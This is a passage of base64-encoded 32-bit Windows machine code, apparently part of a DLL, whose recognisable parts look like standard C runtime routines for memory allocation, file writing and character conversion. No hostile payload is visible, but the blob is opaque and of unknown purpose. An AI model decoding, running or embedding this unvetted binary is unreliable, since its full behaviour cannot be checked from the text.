PhLAAAAA7TRwPj6cAAAD/dRz/dRhX/3X0/3UM/3UI/9bpkAAAADvLfkVq4DPSWPfxg/gCcjmNRAkIPQAEAAB3FuieJgAAi/Q783RqxwbMzAAAg8YI6xpQ6CH5//9ZO8N0CccA3d0AAIPACIvw6wIz9jvzdEH/dfhWV/919P91DP91CP8VJAEBEIXAdCJTUzldHHUEU1PrBv91HP91GP91+FZT/3Ug/xXcAAEQiUX4Vui4/f//Wf919Oiv/f//i0X4WelZAQAAiV30iV3wOV0IdQiLBotAFIlFCDldIHUIiwaLQASJRSD/dQjo6yMAAFmJReyD+P91BzPA6SEBAAA7RSAPhNsAAABTU41NFFH/dRBQ/3Ug6AkkAACDxBiJRfQ7w3TUizUcAQEQU1P/dRRQ/3UM/3UI/9aJRfg7w3UHM/bptwAAAH49g/jgdziDwAg9AAQAAHcW6IglAACL/Dv7dN3HB8zMAACDxwjrGlDoC/j//1k7w3QJxwDd3QAAg8AIi/jrAjP/O/t0tP91+FNX6L+h//+DxAz/dfhX/3UU/3X0/3UM/3UI/9aJRfg7w3UEM/brJf91HI1F+P91GFBX/3Ug/3Xs6FgjAACL8Il18IPEGPfeG/YjdfhX6I38//9Z6xr/dRz/dRj/dRT/dRD/dQz/dQj/FRwBARCL8Dld9HQJ/3X06Lqg//9Zi0XwO8N0DDlFGHQHUOinoP//WYvGjWXgX15bi038M83oKJj//8nDi/9Vi+yD7BD/dQiNTfDoM5r///91KI1N8P91JP91IP91HP91GP91FP91EP91DOgo/P//g8QggH38AHQHi034g2Fw/cnDi/9Vi+xRUaEcUAEQM8WJRfyhSGYBEFNWM9tXi/k7w3U6jUX4UDP2RlZoDAsBEFb/FSwBARCFwHQIiTVIZgEQ6zT/FRwAARCD+Hh1CmoCWKNIZgEQ6wWhSGYBEIP4Ag+EzwAAADvDD4THAAAAg/gBD4XoAAAAiV34OV0YdQiLB4tABIlFGIs1IAEBEDPAOV0gU1P/dRAPlcD/dQyNBMUBAAAAUP91GP/Wi/g7+w+EqwAAAH48gf/w//9/dzSNRD8IPQAEAAB3E+ihIwAAi8Q7w3QcxwDMzAAA6xFQ6Cf2//9ZO8N0CccA3d0AAIPACIvYhdt0aY0EP1BqAFPo3Z///4PEDFdT/3UQ/3UMagH/dRj/1oXAdBH/dRRQU/91CP8VLAEBEIlF+FPoyfr//4tF+FnrdTP2OV0cdQiLB4tAFIlFHDldGHUIiweLQASJRRj/dRzoDCEAAFmD+P91BDPA60c7RRh0HlNTjU0QUf91DFD/dRjoNCEAAIvwg8QYO/N03Il1DP91FP91EP91DP91CP91HP8VKAEBEIv4O/N0B1boqJ7//1mLx41l7F9eW4tN/DPN6CmW///Jw4v/VYvsg+wQ/3UIjU3w6DSY////dSSNTfD/dSD/dRz/dRj/dRT/dRD/dQzoFv7//4PEHIB9/AB0B4tN+INhcP3Jw4v/VYvsVot1CIX2D4SBAQAA/3YE6Die////dgjoMJ7///92DOgonv///3YQ6CCe////dhToGJ7///92GOgQnv///zboCZ7///92IOgBnv///3Yk6Pmd////dijo8Z3///92LOjpnf///3Yw6OGd////djTo2Z3///92HOjRnf///3Y46Mmd////djzowZ3//4PEQP92QOi2nf///3ZE6K6d////dkjopp3///92TOienf///3ZQ6Jad////dlTojp3///92WOiGnf///3Zc6H6d////dmDodp3///92ZOhunf///3Zo6Gad////dmzoXp3///92cOhWnf///3Z06E6d////dnjoRp3///92fOg+nf//g8RA/7aAAAAA6DCd////toQAAADoJZ3///+2iAAAAOganf///7aMAAAA6A+d////tpAAAADoBJ3///+2lAAAAOj5nP///7aYAAAA6O6c////tpwAAADo45z///+2oAAAAOjYnP///7akAAAA6M2c////tqgAAADowpz//4PELF5dw4v/VYvsVot1CIX2dDWLBjsFYFoBEHQHUOifnP//WYtGBDsFZFoBEHQHUOiNnP//WYt2CDs1aFoBEHQHVuh7nP//WV5dw4v/VYvsVot1CIX2dH6LRgw7BWxaARB0B1DoWZz//1mLRhA7BXBaARB0B1DoR5z//1mLRhQ7BXRaARB0B1DoNZz//1mLRhg7BXhaARB0B1DoI5z//1mLRhw7BXxaARB0B1DoEZz//1mLRiA7BYBaARB0B1Do/5v//1mLdiQ7NYRaARB0B1bo7Zv//1leXcOL/1WL7ItFCFMz21ZXO8N0B4t9DDv7dxvo4KH//2oWXokwU1NTU1PoaaH//4P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EvwIAAIuFNOX//4mNQOX//4TbD4XKAAAAiYU85f//OU0QD4YgAwAA6waLtSjl//+LjTzl//+DpUTl//8AK4005f//jYVI5f//O00QczmLlTzl////hTzl//+KEkGA+gp1EP+FMOX//8YADUD/hUTl//+IEED/hUTl//+BvUTl////EwAAcsKL2I2FSOX//yvYagCNhSzl//9QU42FSOX//1CLBv80B/8VOAEBEIXAD4RCAgAAi4Us5f//AYU45f//O8MPjDoCAACLhTzl//8rhTTl//87RRAPgkz////pIAIAAImFROX//4D7Ag+F0QAAADlNEA+GTQIAAOsGi7Uo5f//i41E5f//g6U85f//ACuNNOX//42FSOX//ztNEHNGi5VE5f//g4VE5f//Ag+3EkFBZoP6CnUWg4Uw5f//AmoNW2aJGEBAg4U85f//AoOFPOX//wJmiRBAQIG9POX///4TAABytYvYjYVI5f//K9hqAI2FLOX//1BTjYVI5f//UIsG/zQH/xU4AQEQhcAPhGIBAACLhSzl//8BhTjl//87ww+MWgEAAIuFROX//yuFNOX//ztFEA+CP////+lAAQAAOU0QD4Z8AQAAi41E5f//g6U85f//ACuNNOX//2oCjYVI+f//XjtNEHM8i5VE5f//D7cSAbVE5f//A85mg/oKdQ5qDVtmiRgDxgG1POX//wG1POX//2aJEAPGgb085f//qAYAAHK/M/ZWVmhVDQAAjY3w6///UY2NSPn//yvBmSvC0fhQi8FQVmjp/QAA/xXcAAEQi9g73g+ElwAAAGoAjYUs5f//UIvDK8ZQjYQ18Ov//1CLhSjl//+LAP80B/8VOAEBEIXAdAwDtSzl//873n/L6wz/FRwAARCJhUDl//873n9ci4VE5f//K4U05f//iYU45f//O0UQD4IK////6z9qAI2NLOX//1H/dRD/tTTl////MP8VOAEBEIXAdBWLhSzl//+DpUDl//8AiYU45f//6wz/FRwAARCJhUDl//+DvTjl//8AdWyDvUDl//8AdC1qBV45tUDl//91FOijl///xwAJAAAA6KuX//+JMOs//7VA5f//6K+X//9Z6zGLtSjl//+LBvZEBwRAdA+LhTTl//+AOBp1BDPA6yToY5f//8cAHAAAAOhrl///gyAAg8j/6wyLhTjl//8rhTDl//9fW4tN/DPNXui3iP//ycNqEGhoMQEQ6HXU//+LRQiD+P51G+gvl///gyAA6BSX///HAAkAAACDyP/pnQAAADP/O8d8CDsFCHsBEHIh6AaX//+JOOjslv//xwAJAAAAV1dXV1fodJb//4PEFOvJi8jB+QWNHI0gewEQi/CD5h/B5gaLCw++TDEEg+EBdL9Q6OYVAABZiX38iwP2RDAEAXQW/3UQ/3UM/3UI6C74//+DxAyJReTrFuiJlv//xwAJAAAA6JGW//+JOINN5P/HRfz+////6AkAAACLReTo9dP//8P/dQjoMBYAAFnDi/9Vi+z/BVBmARBoABAAAOggxv//WYtNCIlBCIXAdA2DSQwIx0EYABAAAOsRg0kMBI1BFIlBCMdBGAIAAACLQQiDYQQAiQFdw4v/VYvsi0UIg/j+dQ/o/pX//8cACQAAADPAXcNWM/Y7xnwIOwUIewEQchzo4JX//1ZWVlZWxwAJAAAA6GiV//+DxBQzwOsai8iD4B/B+QWLDI0gewEQweAGD75EAQSD4EBeXcO4oFoBEMOh4HoBEFZqFF6FwHUHuAACAADrBjvGfQeLxqPgegEQagRQ6KDF//9ZWaPcagEQhcB1HmoEVok14HoBEOiHxf//WVmj3GoBEIXAdQVqGlhewzPSuaBaARDrBaHcagEQiQwCg8Egg8IEgfkgXQEQfOpq/l4z0rmwWgEQV4vCwfgFiwSFIHsBEIv6g+cfwecGiwQHg/j/dAg7xnQEhcB1Aokxg8EgQoH5EFsBEHzOXzPAXsPoEBgAAIA9lGMBEAB0BejZFQAA/zXcagEQ6MOO//9Zw4v/VYvsVot1CLigWgEQO/ByIoH+AF0BEHcai84ryMH5BYPBEFHo/dX//4FODACAAABZ6wqDxiBW/xUEAQEQXl3Di/9Vi+yLRQiD+BR9FoPAEFDo0NX//4tFDIFIDACAAABZXcOLRQyDwCBQ/xUEAQEQXcOL/1WL7ItFCLmgWgEQO8FyHz0AXQEQdxiBYAz/f///K8HB+AWDwBBQ6K3U//9ZXcODwCBQ/xUAAQEQXcOL/1WL7ItNCIP5FItFDH0TgWAM/3///4PBEFHoftT//1ldw4PAIFD/FQABARBdw4v/VYvsi0UIVjP2O8Z1Hejjk///VlZWVlbHABYAAADoa5P//4PEFIPI/+sDi0AQXl3Di/9Vi+yD7BChHFABEDPFiUX8U1aLdQz2RgxAVw+FNgEAAFbopv///1m7GFgBEIP4/3QuVuiV////WYP4/nQiVuiJ////wfgFVo08hSB7ARDoef///4PgH1nB4AYDB1nrAovDikAkJH88Ag+E6AAAAFboWP///1mD+P90LlboTP///1mD+P50IlboQP///8H4BVaNPIUgewEQ6DD///+D4B9ZweAGAwdZ6wKLw4pAJCR/PAEPhJ8AAABW6A////9Zg/j/dC5W6AP///9Zg/j+dCJW6Pf+///B+AVWjTyFIHsBEOjn/v//g+AfWcHgBgMHWesCi8P2QASAdF3/dQiNRfRqBVCNRfBQ6MEYAACDxBCFwHQHuP//AADrXTP/OX3wfjD/TgR4EosGikw99IgIiw4PtgFBiQ7rDg++RD30VlDoFqn//1lZg/j/dMhHO33wfNBmi0UI6yCDRgT+eA2LDotFCGaJAYMGAusND7dFCFZQ6HgVAABZWYtN/F9eM81b6MCD///Jw4v/Vlcz/423KF0BEP826Lah//+DxwRZiQaD/yhy6F9ew6EcUAEQg8gBM8k5BVRmARAPlMGLwcOL/1WL7IPsEFNWi3UMM9s783QVOV0QdBA4HnUSi0UIO8N0BTPJZokIM8BeW8nD/3UUjU3w6G6F//+LRfA5WBR1H4tFCDvDdAdmD7YOZokIOF38dAeLRfiDYHD9M8BA68qNRfBQD7YGUOjBhf//WVmFwHR9i0Xwi4isAAAAg/kBfiU5TRB8IDPSOV0ID5XCUv91CFFWagn/cAT/FSABARCFwItF8HUQi00QO4isAAAAciA4XgF0G4uArAAAADhd/A+EZf///4tN+INhcP3pWf///+gxkf//xwAqAAAAOF38dAeLRfiDYHD9g8j/6Tr///8zwDldCA+VwFD/dQiLRfBqAVZqCf9wBP8VIAEBEIXAD4U6////67qL/1WL7GoA/3UQ/3UM/3UI6NT+//+DxBBdw8zMVotEJBQLwHUoi0wkEItEJAwz0vfxi9iLRCQI9/GL8IvD92QkEIvIi8b3ZCQQA9HrR4vIi1wkEItUJAyLRCQI0enR29Hq0dgLyXX09/OL8PdkJBSLyItEJBD35gPRcg47VCQMdwhyDztEJAh2CU4rRCQQG1QkFDPbK0QkCBtUJAz32vfYg9oAi8qL04vZi8iLxl7CEABqDGiIMQEQ6H/N//+LTQgz/zvPdi5q4Fgz0vfxO0UMG8BAdR/oFpD//8cADAAAAFdXV1dX6J6P//+DxBQzwOnVAAAAD69NDIvxiXUIO/d1AzP2RjPbiV3kg/7gd2mDPQR7ARADdUuDxg+D5vCJdQyLRQg7BfB6ARB3N2oE6BDR//9ZiX38/3UI6BbZ//9ZiUXkx0X8/v///+hfAAAAi13kO990Ef91CFdT6A2K//+DxAw733VhVmoI/zWsZAEQ/xUIAQEQi9g733VMOT2YaQEQdDNW6Ijk//9ZhcAPhXL///+LRRA7xw+EUP///8cADAAAAOlF////M/+LdQxqBOi0z///WcM733UNi0UQO8d0BscADAAAAIvD6LPM///DahBoqDEBEOhhzP//i10Ihdt1Dv91DOis3///WenMAQAAi3UMhfZ1DFPo34j//1nptwEAAIM9BHsBEAMPhZMBAAAz/4l95IP+4A+HigEAAGoE6B3Q//9ZiX38U+hG0P//WYlF4DvHD4SeAAAAOzXwegEQd0lWU1DoKNX//4PEDIXAdAWJXeTrNVbo99f//1mJReQ7x3Qni0P8SDvGcgKLxlBT/3Xk6HOJ//9T6PbP//+JReBTUOgc0P//g8QYOX3kdUg793UGM/ZGiXUMg8YPg+bwiXUMVlf/NaxkARD/FQgBARCJReQ7x3Qgi0P8SDvGcgKLxlBT/3Xk6B+J//9T/3Xg6M/P//+DxBTHRfz+////6C4AAACDfeAAdTGF9nUBRoPGD4Pm8Il1DFZTagD/NaxkARD/FRABARCL+OsSi3UMi10IagToTs7//1nDi33khf8Phb8AAAA5PZhpARB0LFbo3OL//1mFwA+F0v7//+itjf//OX3gdWyL8P8VHAABEFDoWI3//1mJButfhf8PhYMAAADoiI3//zl94HRoxwAMAAAA63GF9nUBRlZTagD/NaxkARD/FRABARCL+IX/dVY5BZhpARB0NFboc+L//1mFwHQfg/7gds1W6GPi//9Z6DyN///HAAwAAAAzwOjAyv//w+gpjf//6Xz///+F/3UW6BuN//+L8P8VHAABEFDoy4z//4kGWYvH69KL/1WL7FFRU4tdCFZXM/Yz/4l9/Dsc/VBdARB0CUeJffyD/xdy7oP/Fw+DdwEAAGoD6MIWAABZg/gBD4Q0AQAAagPosRYAAFmFwHUNgz3QXwEQAQ+EGwEAAIH7/AAAAA+EQQEAAGi8GgEQuxQDAABTv1hmARBX6OPb//+DxAyFwHQNVlZWVlbo6or//4PEFGgEAQAAvnFmARBWagDGBXVnARAA/xXMAAEQhcB1JmikGgEQaPsCAABW6KHb//+DxAyFwHQPM8BQUFBQUOimiv//g8QUVuj52///QFmD+Dx2OFbo7Nv//4PuOwPGagO5bGkBEGjICgEQK8hRUOjI6v//g8QUhcB0ETP2VlZWVlboY4r//4PEFOsCM/ZooBoBEFNX6OPp//+DxAyFwHQNVlZWVlboP4r//4PEFItF/P80xVRdARBTV+i+6f//g8QMhcB0DVZWVlZW6BqK//+DxBRoECABAGh4GgEQV+ggFAAAg8QM6zJq9P8VvAABEIvYO950JIP7/3QfagCNRfhQjTT9VF0BEP826Dfb//9ZUP82U/8VOAEBEF9eW8nDagPoRhUAAFmD+AF0FWoD6DkVAABZhcB1H4M90F8BEAF1Fmj8AAAA6Cn+//9o/wAAAOgf/v//WVnDzMzMzMzMzMzMzMzMzMyL/1WL7ItNCLhNWgAAZjkBdAQzwF3Di0E8A8GBOFBFAAB17zPSuQsBAABmOUgYD5TCi8Jdw8zMzMzMzMzMzMzMi/9Vi+yLRQiLSDwDyA+3QRRTVg+3cQYz0leNRAgYhfZ2G4t9DItIDDv5cgmLWAgD2Tv7cgpCg8AoO9Zy6DPAX15bXcPMzMzMzMzMzMzMzMyL/1WL7Gr+aMgxARBogIkAEGShAAAAAFCD7AhTVlehHFABEDFF+DPFUI1F8GSjAAAAAIll6MdF/AAAAABoAAAAEOgq////g8QEhcB0VYtFCC0AAAAQUGgAAAAQ6FD///+DxAiFwHQ7i0Akwegf99CD4AHHRfz+////i03wZIkNAAAAAFlfXluL5V3Di0XsiwiLATPSPQUAAMAPlMKLwsOLZejHRfz+////M8CLTfBkiQ0AAAAAWV9eW4vlXcNqCGjoMQEQ6AfH///oCJz//4tAeIXAdBaDZfwA/9DrBzPAQMOLZejHRfz+////6NETAADoIMf//8Po25v//4tAfIXAdAL/0Om0////aghoCDIBEOi7xv///zVsaQEQ6GqZ//9ZhcB0FoNl/AD/0OsHM8BAw4tl6MdF/P7////off///8xoDcIAEOjEmP//WaNsaQEQw4v/VYvsi0UIo3BpARCjdGkBEKN4aQEQo3xpARBdw4v/VYvsi0UIiw1oWAEQVjlQBHQPi/Fr9gwDdQiDwAw7xnLsa8kMA00IXjvBcwU5UAR0AjPAXcP/NXhpARDo2Jj//1nDaiBoKDIBEOgQxv//M/+JfeSJfdiLXQiD+wt/THQVi8NqAlkrwXQiK8F0CCvBdGQrwXVE6HGa//+L+Il92IX/dRSDyP/pYQEAAL5waQEQoXBpARDrYP93XIvT6F3///+L8IPGCIsG61qLw4PoD3Q8g+gGdCtIdBzoVIj//8cAFgAAADPAUFBQUFDo2of//4PEFOuuvnhpARCheGkBEOsWvnRpARChdGkBEOsKvnxpARChfGkBEMdF5AEAAABQ6BSY//+JReBZM8CDfeABD4TYAAAAOUXgdQdqA+hNu///OUXkdAdQ6DnJ//9ZM8CJRfyD+wh0CoP7C3QFg/sEdRuLT2CJTdSJR2CD+wh1QItPZIlN0MdHZIwAAACD+wh1LosNXFgBEIlN3IsNYFgBEIsVXFgBEAPKOU3cfRmLTdxryQyLV1yJRBEI/0Xc69vofJf//4kGx0X8/v///+gVAAAAg/sIdR//d2RT/1XgWesZi10Ii33Yg33kAHQIagDox8f//1nDU/9V4FmD+wh0CoP7C3QFg/sEdRGLRdSJR2CD+wh1BotF0IlHZDPA6LLE///Di/9Vi+yLRQijhGkBEF3Di/9Vi+yLRQijkGkBEF3Di/9Vi+yLRQijlGkBEF3DahBoSDIBEOgzxP//g2X8AP91DP91CP8VSAEBEIlF5Osvi0XsiwCLAIlF4DPJPRcAAMAPlMGLwcOLZeiBfeAXAADAdQhqCP8VrAABEINl5ADHRfz+////i0Xk6CXE///Di/9Vi+yD7BD/dQiNTfDoIHr//w+2RQyLTfSKVRSEVAEddR6DfRAAdBKLTfCLicgAAAAPtwRBI0UQ6wIzwIXAdAMzwECAffwAdAeLTfiDYXD9ycOL/1WL7GoEagD/dQhqAOia////g8QQXcPMzMzMi0QkCItMJBALyItMJAx1CYtEJAT34cIQAFP34YvYi0QkCPdkJBQD2ItEJAj34QPTW8IQAIv/VYvsagpqAP91COg9DgAAg8QMXcPMzFWL7FNWV1VqAGoAaBTGABD/dQjodhoAAF1fXluL5V3Di0wkBPdBBAYAAAC4AQAAAHQyi0QkFItI/DPI6Bh3//9Vi2gQi1AoUotQJFLoFAAAAIPECF2LRCQIi1QkEIkCuAMAAADDU1ZXi0QkEFVQav5oHMYAEGT/NQAAAAChHFABEDPEUI1EJARkowAAAACLRCQoi1gIi3AMg/7/dDqDfCQs/3QGO3QkLHYtjTR2iwyziUwkDIlIDIN8swQAdRdoAQEAAItEswjoSQAAAItEswjoXwAAAOu3i0wkBGSJDQAAAACDxBhfXlvDM8Bkiw0AAAAAgXkEHMYAEHUQi1EMi1IMOVEIdQW4AQAAAMNTUbsQXgEQ6wtTUbsQXgEQi0wkDIlLCIlDBIlrDFVRUFhZXVlbwgQA/9DDahBoaDIBEOjhwf//M8CLXQgz/zvfD5XAO8d1HeiAhP//xwAWAAAAV1dXV1foCIT//4PEFIPI/+tTgz0EewEQA3U4agToqsX//1mJffxT6NPF//9ZiUXgO8d0C4tz/IPuCYl15OsDi3Xkx0X8/v///+glAAAAOX3gdRBTV/81rGQBEP8VTAEBEIvwi8boocH//8Mz/4tdCIt15GoE6HjE//9Zw4v/VYvsg+wMoRxQARAzxYlF/GoGjUX0UGgEEAAA/3UIxkX6AP8VMAEBEIXAdQWDyP/rCo1F9FDo0v3//1mLTfwzzeg3df//ycOL/1WL7IPsNKEcUAEQM8WJRfyLRRCLTRiJRdiLRRRTiUXQiwBWiUXci0UIVzP/iU3MiX3giX3UO0UMD4RfAQAAizV8AAEQjU3oUVD/1osdIAEBEIXAdF6DfegBdViNRehQ/3UM/9aFwHRLg33oAXVFi3Xcx0XUAQAAAIP+/3UM/3XY6PrS//+L8FlGO/d+W4H+8P//f3dTjUQ2CD0ABAAAdy/oGgEAAIvEO8d0OMcAzMwAAOstV1f/ddz/ddhqAf91CP/Ti/A793XDM8Dp0QAAAFDohNP//1k7x3QJxwDd3QAAg8AIiUXk6wOJfeQ5feR02I0ENlBX/3Xk6DJ9//+DxAxW/3Xk/3Xc/3XYagH/dQj/04XAdH+LXcw733QdV1f/dRxTVv915Ff/dQz/FdwAARCFwHRgiV3g61uLHdwAARA5fdR1FFdXV1dW/3XkV/91DP/Ti/A793Q8VmoB6HSy//9ZWYlF4DvHdCtXV1ZQVv915Ff/dQz/0zvHdQ7/deDoHHz//1mJfeDrC4N93P90BYtN0IkB/3Xk6KzX//9Zi0XgjWXAX15bi038M83og3P//8nDzMzMzMzMzMzMzMzMzFGNTCQIK8iD4Q8DwRvJC8FZ6aoCAABRjUwkCCvIg+EHA8EbyQvBWemUAgAAi/9Vi+yLTQhTM9s7y1ZXfFs7DQh7ARBzU4vBwfgFi/GNPIUgewEQiweD5h/B5gYDxvZABAF0NYM4/3Qwgz3QXwEQAXUdK8t0EEl0CEl1E1Nq9OsIU2r16wNTavb/FVgAARCLB4MMBv8zwOsV6FeB///HAAkAAADoX4H//4kYg8j/X15bXcOL/1WL7ItFCIP4/nUY6EOB//+DIADoKIH//8cACQAAAIPI/13DVjP2O8Z8IjsFCHsBEHMai8iD4B/B+QWLDI0gewEQweAGA8H2QAQBdSToAoH//4kw6OiA//9WVlZWVscACQAAAOhwgP//g8QUg8j/6wKLAF5dw2oMaIgyARDoC77//4t9CIvHwfgFi/eD5h/B5gYDNIUgewEQx0XkAQAAADPbOV4IdTZqCujlwf//WYld/DleCHUaaKAPAACNRgxQ6In5//9ZWYXAdQOJXeT/RgjHRfz+////6DAAAAA5XeR0HYvHwfgFg+cfwecGiwSFIHsBEI1EOAxQ/xUEAQEQi0Xk6Mu9///DM9uLfQhqCuilwP//WcOL/1WL7ItFCIvIg+AfwfkFiwyNIHsBEMHgBo1EAQxQ/xUAAQEQXcOL/1WL7IPsEKEcUAEQM8WJRfxWM/Y5NdBeARB0T4M9VF8BEP51BeiWCwAAoVRfARCD+P91B7j//wAA63BWjU3wUWoBjU0IUVD/FUAAARCFwHVngz3QXgEQAnXa/xUcAAEQg/h4dc+JNdBeARBWVmoFjUX0UGoBjUUIUFb/FVAAARBQ/xXcAAEQiw1UXwEQg/n/dKJWjVXwUlCNRfRQUf8VVAABEIXAdI1mi0UIi038M81e6M1w///Jw8cF0F4BEAEAAADr48zMzMzMzMzMzMzMUY1MJAQryBvA99AjyIvEJQDw//87yHIKi8FZlIsAiQQkwy0AEAAAhQDr6WoQaKgyARDoSbz//zPbiV3kagHoQ8D//1mJXfxqA1+JfeA7PeB6ARB9V4v3weYCodxqARADxjkYdESLAPZADIN0D1DoQQsAAFmD+P90A/9F5IP/FHwoodxqARCLBAaDwCBQ/xXIAAEQodxqARD/NAbogHj//1mh3GoBEIkcBkfrnsdF/P7////oCQAAAItF5OgFvP//w2oB6OS+//9Zw4v/VYvsU1aLdQiLRgyLyIDhAzPbgPkCdUCpCAEAAHQ5i0YIV4s+K/iF/34sV1BW6D/q//9ZUOj65v//g8QMO8d1D4tGDITAeQ+D4P2JRgzrB4NODCCDy/9fi0YIg2YEAIkGXovDW13Di/9Vi+xWi3UIhfZ1CVboNQAAAFnrL1bofP///1mFwHQFg8j/6x/3RgwAQAAAdBRW6Nbp//9Q6MMKAABZ99hZG8DrAjPAXl3DahRoyDIBEOj6uv//M/+JfeSJfdxqAejxvv//WYl9/DP2iXXgOzXgegEQD42DAAAAodxqARCNBLA5OHReiwD2QAyDdFZQVujb6P//WVkz0kKJVfyh3GoBEIsEsItIDPbBg3QvOVUIdRFQ6Er///9Zg/j/dB7/ReTrGTl9CHUU9sECdA9Q6C////9Zg/j/dQMJRdyJffzoCAAAAEbrhDP/i3XgodxqARD/NLBW6OTo//9ZWcPHRfz+////6BIAAACDfQgBi0XkdAOLRdzoe7r//8NqAehavf//WcNqAegf////WcOL/1WL7FFWi3UMVujQ6P//iUUMi0YMWaiCdRnot3z//8cACQAAAINODCC4//8AAOk9AQAAqEB0DeiafP//xwAiAAAA6+GoAXQXg2YEAKgQD4SNAAAAi04Ig+D+iQ6JRgyLRgyDZgQAg2X8AFNqAoPg71sLw4lGDKkMAQAAdSzoqOb//4PAIDvwdAzonOb//4PAQDvwdQ3/dQzoKeb//1mFwHUHVujV5f//WfdGDAgBAABXD4SDAAAAi0YIiz6NSAKJDotOGCv4K8uJTgSF/34dV1D/dQzoyOT//4PEDIlF/OtOg8ggiUYM6T3///+LTQyD+f90G4P5/nQWi8GD4B+L0cH6BcHgBgMElSB7ARDrBbgYWAEQ9kAEIHQVU2oAagBR6DDc//8jwoPEEIP4/3Qti0YIi10IZokY6x1qAo1F/FD/dQyL+4tdCGaJXfzoUOT//4PEDIlF/Dl9/HQLg04MILj//wAA6weLwyX//wAAX1teycOL/1WL7IPsEFNWi3UMM9tXi30QO/N1FDv7dhCLRQg7w3QCiRgzwOmDAAAAi0UIO8N0A4MI/4H/////f3Yb6CF7//9qFl5TU1NTU4kw6Kp6//+DxBSLxutW/3UYjU3w6KBu//+LRfA5WBQPhZwAAABmi0UUuf8AAABmO8F2NjvzdA87+3YLV1NW6FJ1//+DxAzoznr//8cAKgAAAOjDev//iwA4Xfx0B4tN+INhcP1fXlvJwzvzdDI7+3cs6KN6//9qIl5TU1NTU4kw6Cx6//+DxBQ4XfwPhHn///+LRfiDYHD96W3///+IBotFCDvDdAbHAAEAAAA4XfwPhCX///+LRfiDYHD96Rn///+NTQxRU1dWagGNTRRRU4ldDP9wBP8V3AABEDvDdBQ5XQwPhV7///+LTQg7y3S9iQHruf8VHAABEIP4eg+FRP///zvzD4Rn////O/sPhl////9XU1boe3T//4PEDOlP////i/9Vi+xqAP91FP91EP91DP91COh8/v//g8QUXcNqAui+qv//WcOL/1WL7IPsFFZX/3UIjU3s6Fxt//+LRRCLdQwz/zvHdAKJMDv3dSzopXn//1dXV1dXxwAWAAAA6C15//+DxBSAffgAdAeLRfSDYHD9M8Dp2AEAADl9FHQMg30UAnzJg30UJH/Di03sU4oeiX38jX4B